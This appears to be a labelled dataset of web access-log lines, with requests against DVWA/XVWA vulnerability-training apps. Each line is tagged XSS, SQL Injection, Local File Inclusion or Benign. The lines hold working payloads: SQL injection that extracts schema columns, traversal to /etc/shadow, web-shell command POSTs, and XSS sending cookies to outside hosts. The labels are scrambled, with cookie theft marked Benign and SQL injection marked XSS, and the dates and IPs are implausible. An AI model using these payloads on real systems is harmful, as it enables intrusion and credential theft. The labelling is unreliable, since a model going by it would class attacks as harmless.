1.164.74.176 , [12/Mar/2023:08:27:41 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x6775657374626f6f6b%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
173.27.114.111 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1  200 130 ,XSS
167.20.30.216 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1175  ,SQL Injection
187.226.64.32 , [21/Feb/2022:13:30:52 +0800] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 2244  ,SQL Injection
14.65.67.247 , [21/Feb/2022:14:10:35 +0800] ,GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F119.28.107.63%2F430999%27%293C%2Fscript%3E HTTP/1.1   200 4720  ,SQL Injection
204.169.26.211 , [21/Feb/2022:13:33:16 +0800] ,GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F132.144.70.196%2F536457%27%293C%2Fscript%3E HTTP/1.1   200 2570  ,SQL Injection
56.3.129.32 ,  [16/Mar/2023:03:21:50 -0400] ,GET /?file=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F104.232.239.10%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 7536  ,Local File Inclusion
122.226.135.9 , [21/Feb/2022:14:07:38 +0800] ,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1  200 2634 ,SQL Injection
189.81.28.157 , [21/Feb/2022:14:13:49 +0800] ,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1  200 4714 ,SQL Injection
124.59.136.249 , [13/Mar/2022:00:04:04 +0800] ,GET main.cgi?file=../../../../etc/shadow HTTP/1.1  200 2086 ,XSS
239.69.30.191 , [25/Jun/2020:03:09:12 +0000] ,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 6032 ,XSS
31.200.232.228 , [13/Mar/2022:00:29:16 +0800] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,XSS
226.140.42.28 , [27/Aug/2011:03:09:46 +0000] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,XSS
201.202.219.54 , [22/May/2012:00:16:54 +0000] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=whoami&cwd=null] 200 84 ,XSS
69.249.109.216 , [09/Mar/2022:17:00:53 +0800] ,POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1  [cmd=ls&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 124 ,SQL Injection
245.103.115.160 , [25/Jun/2020:03:09:12 +0000] ,POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1  [cmd=whoami&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 84 ,SQL Injection
170.103.93.212 , [27/Dec/2037:12:00:00 +0530] ,GET / HTTP/1.1  [-] 403 208 ,Benign
10.173.55.187 , [16/Mar/2023:04:12:30 -0400] ,GET /favicon.ico HTTP/1.1  [-] 404 209 ,Local File Inclusion
41.219.206.222 , [13/Mar/2022:00:04:04 +0800] ,GET /xvwa/ HTTP/1.1  [-] 200 3382 ,SQL Injection
234.131.78.237 , [13/Mar/2022:00:04:41 +0800] ,GET /xvwa/img/xvwa-logo.png HTTP/1.1  [-] 304 0 ,SQL Injection
13.119.17.86 , [12/Mar/2023:08:27:00 -0400] ,GET /xvwa/vulnerabilities/ssti/ HTTP/1.1  [-] 200 3112 ,SQL Injection
164.143.53.213 , [13/Mar/2022:00:04:01 +0800] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2219 ,Local File Inclusion
35.111.96.96 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 209 ,SQL Injection
233.170.130.146 , [07/Mar/2022:16:41:41 +0800] ,GET /dvwa/vulnerabilities/brute/ HTTP/1.1  [-] 200 1475 ,XSS
203.53.3.219 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 200 593 ,XSS
22.249.195.78 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Benign
92.236.100.145 , [10/Mar/2023:04:27:28 -0500] ,GET /dvwa/vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Benign
0.182.184.136 , [13/Mar/2022:00:04:04 +0800] ,GET / HTTP/1.1  [-] 403 152 ,Local File Inclusion
99.205.41.64 , [25/Jun/2020:03:09:12 +0000] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
249.134.37.199 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa HTTP/1.1  [-] 301 194 ,SQL Injection
242.171.182.45 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/ HTTP/1.1  [-] 302 5 ,Local File Inclusion
159.147.172.124 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/login.php HTTP/1.1  [-] 200 684 ,Local File Inclusion
213.5.94.204 , [21/Feb/2022:14:43:44 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 200 842 ,XSS
84.152.207.188 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 200 9088 ,XSS
175.116.98.84 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/setup.php HTTP/1.1  [-] 200 2085 ,Benign
168.59.44.160 , [21/Feb/2022:14:11:25 +0800] ,GET /dvwa/dvwa/images/spanner.png HTTP/1.1  [-] 200 464 ,Benign
192.49.147.104 , [16/Mar/2023:03:41:51 -0400] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 152 ,SQL Injection
117.25.225.118 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2202 ,XSS
76.154.60.131 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/lock.png HTTP/1.1  [-] 200 761 ,XSS
99.98.64.49 ,  [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 152 ,SQL Injection
209.140.166.233 , [10/Mar/2023:05:32:31 -0500] ,GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F145.190.136.169%22%3C%2Fscript%3E HTTP/1.1   200 1297  ,Benign
92.232.133.140 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F183.250.61.150%22%3C%2Fscript%3E HTTP/1.1   200 3886  ,Local File Inclusion
249.100.45.81 , [13/Mar/2022:00:04:41 +0800] ,GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F124.25.127.129%2F898879.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 4972  ,Benign
98.247.249.191 , [09/Mar/2022:17:00:52 +0800] ,GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F141.19.75.249%2F869455.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 4879 ,XSS
178.7.109.61 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 3288  ,Local File Inclusion
139.206.69.187 , [07/Mar/2023:10:44:02 -0500] ,GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 3982  ,Benign
8.10.218.67 ,  [27/Aug/2011:03:09:46 +0000] ,GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F181.217.202.255%2F488204%27%293C%2Fscript%3E HTTP/1.1   200 1285  ,SQL Injection
217.127.218.175 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F4.8.29.8%2F894133%27%293C%2Fscript%3E HTTP/1.1   200 7337  ,Benign
5.93.68.132 ,  [09/Mar/2022:17:00:51 +0800] ,GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F136.108.230.32%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 2624  ,Local File Inclusion
139.196.109.201 , [09/Mar/2022:17:02:45 +0800] ,GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F156.136.208.75%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 5807  ,Local File Inclusion
160.188.52.89 , [25/Jun/2020:03:09:12 +0000] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F0.156.130.88%22%3C%2Fscript%3E HTTP/1.1   200 4228  ,Benign
16.76.200.108 , [13/Mar/2022:00:51:52 +0800] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F110.108.96.122%22%3C%2Fscript%3E HTTP/1.1   200 4935  ,Local File Inclusion
0.203.137.47 , [27/Aug/2011:03:09:46 +0000] ,GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F111.115.213.48%2F804199.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 7000  ,Benign
238.164.84.171 , [12/Mar/2023:08:29:11 -0400] ,GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F164.235.246.70%2F796213.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 2687  ,Benign
146.80.198.140 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 4343  ,XSS
33.27.127.6 ,  [27/Dec/2037:12:00:00 +0530] ,GET /?p=%3Cscript%3E%window.open%28%27http%3A%2F%2F172.68.135.129%2F47198%27%293C%2Fscript%3E HTTP/1.1   200 2330  ,Benign
96.182.134.66 , [09/Mar/2022:17:00:55 +0800] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F153.131.117.236%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 1732  ,Local File Inclusion
68.152.140.71 , [25/Jun/2020:03:09:12 +0000] ,GET /?p=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F100.183.88.107%22%3C%2Fscript%3E HTTP/1.1   200 2158  ,Benign
37.78.85.232 , [07/Mar/2022:16:15:53 +0800] ,GET /?search=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F107.238.201.227%2F763569.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 5551  ,XSS
45.6.61.135 ,  [22/May/2012:00:16:54 +0000] ,GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1472  ,Local File Inclusion
29.96.14.70 ,  [13/Mar/2022:00:29:53 +0800] ,GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1604  ,SQL Injection
228.191.239.211 , [07/Mar/2022:16:41:41 +0800] ,GET /?search=%3Cscript%3E%window.open%28%27http%3A%2F%2F143.46.228.198%2F106135%27%293C%2Fscript%3E HTTP/1.1   200 7076  ,Benign
85.177.123.189 , [13/Mar/2022:00:14:02 +0800] ,GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F114.61.64.247%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 6421  ,Benign
249.168.209.45 , [13/Mar/2022:00:14:02 +0800] ,GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F12.66.35.241%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 6644  ,Local File Inclusion
250.27.242.62 , [10/Mar/2023:04:27:28 -0500] ,GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F12.80.50.136%22%3C%2Fscript%3E HTTP/1.1   200 3879  ,Local File Inclusion
154.89.118.46 , [13/Mar/2022:00:04:04 +0800] ,GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F152.4.200.33%22%3C%2Fscript%3E HTTP/1.1   200 6953  ,Benign
250.199.89.124 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
107.158.43.105 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
119.101.157.10 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/images/logo.png HTTP/1.1  [-] 304 0 ,XSS
223.121.219.94 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
142.232.90.120 , [21/Feb/2022:14:43:44 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1  [-] 200 1593 ,XSS
94.77.96.139 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1  [-] 200 1593 ,XSS
128.154.59.250 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cbody%20onload=alert(1)%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
146.125.27.225 , [21/Feb/2022:14:11:25 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1  [-] 200 1593 ,Local File Inclusion
142.251.15.54 , [16/Mar/2023:03:41:51 -0400] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1  [-] 200 1593 ,Local File Inclusion
38.65.215.63 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
140.43.87.185 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
193.58.28.218 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 200 1590 ,XSS
7.63.39.202 ,  [10/Mar/2023:05:32:31 -0500] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 302 5 ,SQL Injection
92.55.132.160 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1  [-] 200 1593 ,XSS
123.130.245.153 , [13/Mar/2022:00:04:41 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1  [-] 200 1593 ,XSS
127.57.111.251 , [09/Mar/2022:17:00:52 +0800] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1  [-] 200 1477 ,Benign
191.197.188.199 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1  [-] 200 1480 ,Local File Inclusion
112.41.203.176 , [07/Mar/2023:10:44:02 -0500] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E HTTP/1.1  [-] 200 1470 ,Benign
